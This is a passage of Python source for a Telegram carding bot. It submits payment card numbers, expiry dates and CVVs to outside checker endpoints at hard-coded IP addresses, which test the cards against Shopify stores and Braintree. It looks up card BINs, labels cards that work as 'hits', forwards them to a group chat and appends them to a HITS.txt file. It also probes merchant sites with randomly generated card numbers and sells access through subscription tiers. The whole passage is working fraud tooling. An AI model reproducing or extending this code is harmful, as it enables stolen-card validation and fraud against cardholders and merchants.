    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

def test_shopify_site(url):
    """Test if a Shopify site is reachable and working with a random card"""
    try:
        # Generate a random test card
        random_bin = ''.join(random.choices('0123456789', k=6))
        random_cc = f"{random_bin}{''.join(random.choices('0123456789', k=10))}"
        random_mm = str(random.randint(1, 12)).zfill(2)
        random_yy = str(random.randint(23, 30)).zfill(2)
        random_cvv = ''.join(random.choices('0123456789', k=3))
        test_card = f"{random_cc}|{random_mm}|{random_yy}|{random_cvv}"
        
        api_url = f"http://152.42.172.56/autodark.php?cc={test_card}&site={url}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return False, "Site not reachable", "0.0", "shopify_payments", "No response"
            
        response_text = response.text
        
        # Parse response
        price = "1.0"  # default
        gateway = "shopify_payments"  # default
        api_message = "No response"
        
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except:
            pass
            
        return True, api_message, price, gateway, "Site is reachable and working"
        
    except Exception as e:
        return False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error"

@bot.message_handler(commands=['seturl'])
def handle_seturl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /seturl <your_shopify_site_url>")
            return
            
        url = parts[1].strip()
        
        # Validate URL format
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        # Check if URL is valid Shopify site
        status_msg = bot.reply_to(message, f"🔄 Adding URL: <code>{url}</code>\nTesting reachability...", parse_mode='HTML')
        
        # Phase 1: Basic URL check
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Invalid URL format: {str(e)}")
            return
            
        # Phase 2: Test reachability
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"🔄 Testing URL: <code>{url}</code>\nTesting with random card...",
                            parse_mode='HTML')
        
        # Phase 3: Test with random card
        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
        if not is_valid:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Failed to verify Shopify site:\n{test_message}\nPlease check your URL and try again.")
            return
            
        # Store the URL with price
        USER_SITES[user_id] = {
            'url': url,
            'price': price
        }
        save_user_sites()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"""
┏━━━━━━━⍟
┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅
┗━━━━━━━━━━━⊛
                            
❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message}
❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}

<i>You can now check cards with /sh command</i>
─────── ⸙ ────────
""",
                            parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['rmurl'])
def handle_rmurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You don't have any site to remove. Add a site with /seturl")
            return
            
        del USER_SITES[user_id]
        save_user_sites()
        bot.reply_to(message, "✅ Your Shopify site has been removed successfully.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['myurl'])
def handle_myurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You haven't added any site yet. Add a site with /seturl <your_shopify_url>")
            return
            
        site_info = USER_SITES[user_id]
        bot.reply_to(message, f"""Your Shopify site details:

URL: <code>{site_info['url']}</code>
Default Amount: ${site_info.get('price', '1.0')}

Use /sh command to check cards""", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def check_shopify_cc(cc, site_info):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # Get BIN info
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🇺🇳'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🇺🇳')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except:
            pass

        # Make API request
        api_url = f"http://152.42.172.56/autodark.php?cc={formatted_cc}&site={site_info['url']}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        # Parse response text
        response_text = response.text
        
        # Default values
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = 'shopify_payments'
        status = 'DECLINED'
        
        # Extract data from response text
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
                
                # Process response according to new rules
                response_upper = api_message.upper()
                if 'THANK YOU' in response_upper:
                    bot_response = 'ORDER CONFIRM!'
                    status = 'APPROVED'
                elif '3DS' in response_upper:
                    bot_response = 'OTP_REQUIRED'
                    status = 'APPROVED_OTP'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
                    bot_response = api_message
                    status = 'APPROVED_OTP'
                else:
                    bot_response = api_message
            else:
                bot_response = api_message
                
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except Exception as e:
            bot_response = f"Error parsing response: {str(e)}"
        
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': f"Self Shopify [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

def format_shopify_response(result, user_full_name, processing_time):
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7820713047":
        user_status = "Owner"
    elif user_id_str in ADMIN_IDS:
        user_status = "Admin"
    elif is_user_subscribed(int(user_id_str)):
        user_status = "Premium"
    else:
        user_status = "Free"

    response = f"""
┏━━━━━━━⍟
┃ {status_text[result['status']]} {status_emoji[result['status']]}
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <i>{result['gateway']}</i>  
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>{result['message']}</i>

⌯ 𝗜𝗻𝗳𝗼 ➳ {result['brand']}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {result['type']}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {result['country']}

⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ {user_full_name}[{user_status}]
⌯ 𝐃𝐞𝐯 ⌁ <a href='tg://user?id=6521162324'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>
⌯ 𝗧𝗶𝗺𝗲 ➳ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    return response

@bot.message_handler(commands=['sh'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
def handle_sh(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Check if user has set a URL
    user_id = str(message.from_user.id)
    if user_id not in USER_SITES:
        bot.reply_to(message, "❌ You haven't added any site yet. Add a site with /seturl <your_shopify_url>\nUse /myurl to view your site details")
        return

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/sh' or '.sh' without arguments)
        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
           (message.text.startswith('.sh') and len(message.text.strip()) == 3):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[4:].strip()  # remove ".sh "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Self Shopify [${USER_SITES[user_id].get('price', '1.0')}]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>",
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc, USER_SITES[user_id])
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_shopify_response(result, user_full_name, processing_time)

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=response_text,
                    parse_mode='HTML'
                )

                # Auto forward hits
                try:
                    if result['status'] in ['APPROVED', 'APPROVED_OTP']:
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /sh] {e}")

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ An error occurred: {str(e)}"
                )

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        
# Add this near the top with other constants
USER_SITES_FILE_2 = "user_sites_2.json"
GATEWAY_NAME = "Self Shopify 2"

# Add this with other initialization code
USER_SITES_2 = {}
if os.path.exists(USER_SITES_FILE_2):
    with open(USER_SITES_FILE_2, 'r') as f:
        USER_SITES_2 = json.load(f)

def save_user_sites_2():
    with open(USER_SITES_FILE_2, 'w') as f:
        json.dump(USER_SITES_2, f)

# Status texts and emojis
status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '❎',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

def test_shopify_site_2(url):
    """Test if a Shopify site is reachable and working with a random card"""
    try:
        # Generate a random test card
        random_bin = ''.join(random.choices('0123456789', k=6))
        random_cc = f"{random_bin}{''.join(random.choices('0123456789', k=10))}"
        random_mm = str(random.randint(1, 12)).zfill(2)
        random_yy = str(random.randint(23, 30)).zfill(2)
        random_cvv = ''.join(random.choices('0123456789', k=3))
        test_card = f"{random_cc}|{random_mm}|{random_yy}|{random_cvv}"
        
        api_url = f"http://5.230.230.107/index.php?&cc={test_card}&site={url}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return False, "Site not reachable", "0.0", GATEWAY_NAME, "No response"
            
        response_text = response.text
        
        # Parse response
        price = "1.0"  # default
        gateway = GATEWAY_NAME  # default
        api_message = "No response"
        
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
        except:
            pass
            
        return True, api_message, price, gateway, "Site is reachable and working"
        
    except Exception as e:
        return False, f"Error testing site: {str(e)}", "0.0", GATEWAY_NAME, "Error"

@bot.message_handler(commands=['addurl'])
def handle_addurl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /addurl <your_shopify_site_url>")
            return
            
        url = parts[1].strip()
        
        # Validate URL format
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        # Check if URL is valid Shopify site
        status_msg = bot.reply_to(message, f"🔄 Adding URL: <code>{url}</code>\nTesting reachability...", parse_mode='HTML')
        
        # Phase 1: Basic URL check
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Invalid URL format: {str(e)}")
            return
            
        # Phase 2: Test reachability
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"🔄 Testing URL: <code>{url}</code>\nTesting with random card...",
                            parse_mode='HTML')
        
        # Phase 3: Test with random card
        is_valid, api_message, price, gateway, test_message = test_shopify_site_2(url)
        if not is_valid:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Failed to verify Shopify site:\n{test_message}\nPlease check your URL and try again.")
            return
            
        # Store the URL with price
        USER_SITES_2[user_id] = {
            'url': url,
            'price': price
        }
        save_user_sites_2()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"""
┏━━━━━━━⍟
┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅
┗━━━━━━━━━━━⊛
                            
❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message}
❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}

<i>You can now check cards with /sh command</i>
─────── ⸙ ────────""",
                            parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['rurl'])
def handle_rurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES_2:
            bot.reply_to(message, "You don't have any site to remove. Add a site with /addurl")
            return
            
        del USER_SITES_2[user_id]
        save_user_sites_2()
        bot.reply_to(message, "✅ Your Shopify site has been removed successfully.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['url'])
def handle_url(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES_2:
            bot.reply_to(message, "You haven't added any site yet. Add a site with /addurl <your_shopify_url>")
            return
            
        site_info = USER_SITES_2[user_id]
        bot.reply_to(message, f"""Your Shopify site details:

URL: <code>{site_info['url']}</code>
Default Amount: ${site_info.get('price', '1.0')}

Use /so command to check cards""", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def check_shopify_cc_2(cc, site_info):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'gateway': f"{GATEWAY_NAME} [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # Get BIN info
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🇺🇳'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🇺🇳')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except:
            pass

        # Make API request
        api_url = f"http://5.230.230.107/index.php?&cc={formatted_cc}&site={site_info['url']}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': f"{GATEWAY_NAME} [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        # Parse response text
        response_text = response.text
        
        # Default values
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = GATEWAY_NAME
        status = 'DECLINED'
        
        # Extract data from response text
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
                
                # Process response according to new rules
                response_upper = api_message.upper()
                if 'THANK YOU' in response_upper:
                    bot_response = 'ORDER CONFIRM!'
                    status = 'APPROVED'
                elif '3D' in response_upper:
                    bot_response = 'OTP_REQUIRED'
                    status = 'APPROVED_OTP'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
                    bot_response = api_message
                    status = 'APPROVED_OTP'
                else:
                    bot_response = api_message
            else:
                bot_response = api_message
                
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
        except Exception as e:
            bot_response = f"Error parsing response: {str(e)}"
        
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': f"{GATEWAY_NAME} [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'gateway': f"{GATEWAY_NAME} [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

def format_shopify_response_2(result, user_full_name, processing_time):
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7820713047":
        user_status = "Owner"
    elif user_id_str in ADMIN_IDS:
        user_status = "Admin"
    elif is_user_subscribed(int(user_id_str)):
        user_status = "Premium"
    else:
        user_status = "Free"

    response = f"""
┏━━━━━━━⍟
┃ {status_text[result['status']]} {status_emoji[result['status']]}
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <i>{result['gateway']}</i>  
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>{result['message']}</i>

⌯ 𝗜𝗻𝗳𝗼 ➳ {result['brand']}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {result['type']}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {result['country']}

⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ {user_full_name}[{user_status}]
⌯ 𝐃𝐞𝐯 ⌁ <a href='tg://user?id=6521162324'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>
⌯ 𝗧𝗶𝗺𝗲 ➳ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    return response

@bot.message_handler(commands=['so'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.so '))  # Added this line for dot command
def handle_so(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "This group is not approved to use this bot.")
        return

    # Check if user has set a URL
    user_id = str(message.from_user.id)
    if user_id not in USER_SITES_2:
        bot.reply_to(message, "You haven't added any site yet. Add a site with /addurl <your_shopify_url>\nUse /url to view your site details")
        return

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "Invalid format. Use /so CC|MM|YYYY|CVV or .so CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".so "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{GATEWAY_NAME} [${USER_SITES_2[user_id].get('price', '1.0')}]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_shopify_cc_2(cc, USER_SITES_2[user_id])
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_shopify_response_2(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                # Auto forward hits
                try:
                    if result['status'] in ['APPROVED', 'APPROVED_OTP']:
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /so] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")   

def check_bt_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Auth 2'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Auth 2'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Auth 2'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Auth 2'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Auth 2'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Auth 2'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(BT_API_URL.format(formatted_cc), headers=headers, timeout=180)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Auth 2'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Auth 2'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Auth 2'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Auth 2'
                    }
            else:
                return {
